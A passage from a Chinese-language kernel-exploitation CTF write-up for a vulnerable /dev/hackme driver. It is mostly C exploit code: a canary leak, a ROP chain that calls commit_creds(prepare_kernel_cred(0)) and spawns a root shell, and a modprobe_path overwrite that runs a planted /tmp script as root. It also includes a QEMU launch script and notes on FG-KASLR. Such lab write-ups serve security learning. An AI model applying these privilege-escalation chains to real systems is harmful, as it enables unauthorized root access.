punctuation\">;</span>\nsize_t swapgs_pop_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0xa55f</span><span class=\"token punctuation\">;</span>\nsize_t iretq_ret <span class=\"token operator\">=</span> <span class=\"token number\">0xc0d9</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">,</span> size_t address <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s : \\033[0m%#lx\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[31m\\033[1m[Error] %s\\n\\033[0m\"</span> <span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to get root\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Get root!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"mov user_cs, cs;\"</span>\n        <span class=\"token string\">\"mov user_ss, ss;\"</span>\n        <span class=\"token string\">\"mov user_sp, rsp;\"</span>\n        <span class=\"token string\">\"pushf;\"</span>\n        <span class=\"token string\">\"pop user_rflags;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status saved!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span> size_t buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>len<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x%-4x -> 0x%lx\\n\"</span> <span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    commit_creds <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    prepare_kernel_cred <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    pop_rdi_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rdx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rcx_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    mov_rdi_rax_jne_pop2_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    cmp_rdx_jne_pop2_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    swapgs_pop_rbp_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    iretq_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"commit_creds\"</span> <span class=\"token punctuation\">,</span> commit_creds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prepare_kernel_cred\"</span> <span class=\"token punctuation\">,</span> prepare_kernel_cred<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    size_t buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t canary <span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">int</span> length <span class=\"token operator\">=</span>  <span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">signal</span><span class=\"token punctuation\">(</span>SIGSEGV<span class=\"token punctuation\">,</span> shell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/hackme\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> buf <span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>buf <span class=\"token punctuation\">,</span> length<span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    canary <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n\n    <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> canary<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// rop[i++] = (size_t)get_shell;</span>\n\n    <span class=\"token comment\">//commit_creads(prepare_kernel_cred(0));</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> prepare_kernel_cred<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdx_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cmp_rdx_jne_pop2_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> mov_rdi_rax_jne_pop2_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> commit_creds<span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> swapgs_pop_rbp_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> iretq_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>shell<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_cs<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_rflags<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_ss<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> rop <span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h3 id=\"level4-开启-smapsmep-kpti-fg-kaslr\"><a class=\"markdownIt-Anchor\" href=\"#level4-开启-smapsmep-kpti-fg-kaslr\">#</a> level4  开启 SMAP/SMEP KPTI FG-KASLR</h3>\n<p>问为什么没有 level3 ，本题开的是 FG-KASLR，level3 便是开 KASLR 的版本，和上面 level2 相比多了个泄露地址和计算真实地址的过程</p>\n<p>启动脚本</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">gcc exp.c -static -o .&#x2F;fs&#x2F;exp\n# gcc exp.c -masm&#x3D;intel -static -o .&#x2F;fs&#x2F;exp\ncd fs\nfind . | cpio -o --format&#x3D;newc &gt; ..&#x2F;rootfs.cpio\ncd ..\n\nqemu-system-x86_64 \\\n    -m 256M \\\n    -cpu kvm64,+smep,+smap \\\n    -kernel vmlinuz \\\n    -initrd rootfs.cpio \\\n    -hdb flag.txt \\\n    -snapshot \\\n    -nographic \\\n    -monitor &#x2F;dev&#x2F;null \\\n    -no-reboot \\\n    -s \\\n    -append &quot;console&#x3D;ttyS0 kaslr kpti&#x3D;1 quiet panic&#x3D;1&quot;</code></pre>\n<blockquote>\n<p>那么开启 FG-KASLR 之后粒度更细，但内核中始终有一些区域是不受影响的，我们就可以从这里面找 gadget，但是开 FG-KASLR 后，从 rax 到 rdi 的 gadget 就没有了。。所以调用 <code>commit_creads(prepare_kernel_cred(0))</code>  会非常折磨，因此另一种方法就应运而生 —— 覆写 modprobe_path 技术，这种方法使用的 gadget 比较少，限制也比较少，很多情况都可以通杀。</p>\n</blockquote>\n<h4 id=\"modprobe_path\"><a class=\"markdownIt-Anchor\" href=\"#modprobe_path\">#</a> modprobe_path</h4>\n<p>当我们在系统上执行文件类型未知的文件时，系统将会执行当前路径存储在 modprobe_path 中的任何文件。因此，我们可以使用任意写入原语，将 modprobe_path 覆盖到我们自己编写的 Shell 脚本的路径中，然后执行具有未知文件签名的虚拟文件。其结果将导致在系统仍处于内核模式时执行 Shell 脚本，从而导致 root 权限的任意代码执行。</p>\n<p>简而言之，就是覆盖 modprobe_path 里的路径，之后在这个路径文件写上自己的命令，从而在内核执行该命令来 getshell，而执行 modprobe_path 的条件就是执行系统未知的文件，是现在比较主流的方法。</p>\n<blockquote>\n<p>另外这里摸个题外话，有些 gadget 通过 ROPgadget 找不到是因为我们 x86 的指令是不定长的，有些网上的 exp 找到的 gadget 可能是通过指令错位找到的 gadget ，因此，还是比较建议通过  <code>objdump</code>  来找</p>\n</blockquote>\n<h5 id=\"exp-4\"><a class=\"markdownIt-Anchor\" href=\"#exp-4\">#</a> exp</h5>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nsize_t vmlinux_base <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff81000000</span><span class=\"token punctuation\">;</span>\nsize_t user_cs<span class=\"token punctuation\">,</span> user_ss<span class=\"token punctuation\">,</span> user_rflags<span class=\"token punctuation\">,</span> user_sp<span class=\"token punctuation\">;</span>\n\nsize_t swapgs_restore_regs_and_return_to_usermode <span class=\"token operator\">=</span> <span class=\"token number\">0x200f10</span><span class=\"token punctuation\">;</span>\nsize_t kpti_trampoline <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nsize_t modprobe_path <span class=\"token operator\">=</span> <span class=\"token number\">0x1061820</span><span class=\"token punctuation\">;</span>\n\nsize_t write_rbx_rax_pop_rbx_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x306d</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// ffffffff8100306d:\t48 89 03             \tmov    QWORD PTR [rbx],rax</span>\n<span class=\"token comment\">// ffffffff81003070:\t5b                   \tpop    rbx</span>\n<span class=\"token comment\">// ffffffff81003071:\t5d                   \tpop    rbp</span>\n<span class=\"token comment\">// ffffffff81003072:\tc3                   \tret</span>\n\nsize_t pop_rbx_r12_r13_rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x3039</span><span class=\"token punctuation\">;</span>\nsize_t pop_rax_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4d11</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">,</span> size_t address <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s : \\033[0m%#lx\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[31m\\033[1m[Error] %s\\n\\033[0m\"</span> <span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"mov user_cs, cs;\"</span>\n        <span class=\"token string\">\"mov user_ss, ss;\"</span>\n        <span class=\"token string\">\"mov user_sp, rsp;\"</span>\n        <span class=\"token string\">\"pushf;\"</span>\n        <span class=\"token string\">\"pop user_rflags;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status saved!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span> size_t buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>len<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x%-4x -> 0x%lx\\n\"</span> <span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n    swapgs_restore_regs_and_return_to_usermode <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    kpti_trampoline <span class=\"token operator\">=</span> swapgs_restore_regs_and_return_to_usermode <span class=\"token operator\">+</span> <span class=\"token number\">22</span><span class=\"token punctuation\">;</span>\n    pop_rbx_r12_r13_rbp_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    modprobe_path <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    write_rbx_rax_pop_rbx_rbp_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    pop_rax_ret <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"vmlinux_base\"</span> <span class=\"token punctuation\">,</span> vmlinux_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"modprobe_path\"</span> <span class=\"token punctuation\">,</span> modprobe_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop_rax_ret\"</span> <span class=\"token punctuation\">,</span> pop_rax_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"write_rbx_rax_pop_rbx_rbp_ret\"</span> <span class=\"token punctuation\">,</span> write_rbx_rax_pop_rbx_rbp_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kpti_trampoline\"</span> <span class=\"token punctuation\">,</span> kpti_trampoline<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Write command\"</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"echo '#!/bin/sh\\ncp /dev/sda /tmp/flag\\nchmod 777 /tmp/flag' > /tmp/x\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chmod +x /tmp/x\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /tmp/dummy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chmod +x /tmp/dummy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Run unknown file\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/dummy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /tmp/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    size_t buf<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t rop<span class=\"token punctuation\">[</span><span class=\"token number\">0x600</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    size_t canary <span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">int</span> length <span class=\"token operator\">=</span>  <span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token 